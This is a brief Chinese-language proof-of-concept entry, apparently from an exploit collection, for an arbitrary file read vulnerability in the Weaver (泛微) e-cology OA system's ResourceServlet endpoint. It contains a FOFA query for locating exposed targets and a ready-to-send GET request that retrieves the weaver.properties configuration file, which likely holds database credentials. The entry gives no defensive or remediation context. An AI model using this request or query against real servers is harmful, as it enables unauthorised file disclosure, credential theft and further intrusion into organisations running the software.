## 泛微-OA系统ResourceServlet接口任意文件读取漏洞

## fofa
```
app="泛微-OA(e-cology)"
```

## poc
```
GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
```
